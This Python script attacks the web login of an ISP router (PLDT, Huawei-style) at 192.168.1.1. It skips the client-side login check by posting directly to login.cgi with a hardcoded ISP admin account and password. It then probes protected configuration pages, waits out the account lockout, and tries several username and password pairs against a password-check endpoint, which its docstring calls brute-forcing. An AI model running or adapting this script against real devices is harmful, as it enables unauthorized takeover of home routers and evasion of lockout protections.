#!/usr/bin/env python3
"""Check UPnP description, try login.asp flow, and brute-force after lockout."""
import requests, urllib3, base64, time

urllib3.disable_warnings()
ROUTER = "https://192.168.1.1"

s = requests.Session()
s.verify = False

# 1. Check UPnP description
print("1. UPnP Description XML...")
try:
    r = s.get(ROUTER + "/igddesc.xml", timeout=10)
    print(r.text[:2000])
except Exception as e:
    print("   Error:", e)

# 2. Try login.asp with adminpldt (bypass client-side check, submit directly to login.cgi)
print("\n2. login.asp -> login.cgi flow as adminpldt...")
try:
    # Get login.asp first to establish cookies
    r = s.get(ROUTER + "/login.asp", timeout=10)
    print("   login.asp status:", r.status_code, "size:", len(r.text))

    # Check cookies
    print("   Cookies:", dict(s.cookies))

    # Get CSRF token
    r2 = s.get(ROUTER + "/asp/GetRandCount.asp", timeout=10)
    token = r2.content.decode("utf-8-sig").strip()
    print("   Token:", token[:50])

    # Try login as adminpldt
    pwd_b64 = base64.b64encode(b"AC2DIU7QW3ERTY6UPAS4DFG").decode()
    print("   pwd_b64:", pwd_b64)

    r = s.post(ROUTER + "/login.cgi",
               data={
                   "UserName": "adminpldt",
                   "PassWord": pwd_b64,
                   "Language": "english",
                   "x.X_HW_Token": token,
               },
               allow_redirects=False,
               timeout=10)

    print("   login.cgi response:")
    print("   Status:", r.status_code)
    print("   Headers:", dict(r.headers))
    print("   Set-Cookie:", r.headers.get("Set-Cookie", "none"))
    print("   Body:", r.text[:500])
    print("   Cookies after:", dict(s.cookies))

    # If redirected, follow manually
    if r.status_code in (301, 302):
        redirect_url = r.headers.get("Location", "")
        print("\n   Following redirect to:", redirect_url)
        r2 = s.get(ROUTER + redirect_url, timeout=10)
        print("   Response:", r2.status_code, "size:", len(r2.text))
        print("   Cookies:", dict(s.cookies))

except Exception as e:
    print("   Error:", e)

# 3. Try accessing pages with cookies from login attempt
print("\n3. Trying protected pages with login.cgi cookies...")
for pg in ["/html/amp/wlanbasic/WlanBasic.asp?2G",
           "/html/ssmp/info/basic/system_info.asp"]:
    try:
        r = s.get(ROUTER + pg, timeout=10)
        has_login = "txt_Username" in r.text
        print("   " + pg + " -> " + str(r.status_code) + " login:" + str(has_login) + " size:" + str(len(r.text)))
        if not has_login and len(r.text) > 500:
            from html.parser import HTMLParser
            class T(HTMLParser):
                def __init__(self):
                    super().__init__()
                    self.t = []
                    self.skip = False
                def handle_starttag(self, tag, attrs):
                    if tag in ('script', 'style'): self.skip = True
                def handle_endtag(self, tag):
                    if tag in ('script', 'style'): self.skip = False
                def handle_data(self, data):
                    if not self.skip:
                        d = data.strip()
                        if d: self.t.append(d)
            te = T()
            te.feed(r.text[:15000])
            print("   Content:", " ".join(te.t[:30])[:300])
    except Exception as e:
        print("   " + pg + " -> Error:", e)

# 4. Wait for lockout and try CheckPwdNotLogin.asp
print("\n4. Waiting 2 min then checking CheckPwdNotLogin.asp...")
time.sleep(120)
s2 = requests.Session()
s2.verify = False
for user, pwd in [("adminpldt", "AC2DIU7QW3ERTY6UPAS4DFG"), ("admin", "Admin1234"), ("admin", "test")]:
    try:
        r = s2.post(ROUTER + "/asp/CheckPwdNotLogin.asp",
                    data={"UserNameInfo": user, "NormalPwdInfo": pwd},
                    timeout=10)
        result = r.text.strip()
        print("   " + user + ":" + pwd[:15] + " -> " + repr(result) + " (" + str(r.status_code) + ")")
    except Exception as e:
        print("   " + user + " -> Error:", e)

# 5. Check DNS for any records
print("\n5. DNS info...")
import subprocess
try:
    r = subprocess.run(["nslookup", "192.168.1.1"], capture_output=True, text=True, timeout=5)
    print(r.stdout[:500])
except:
    pass
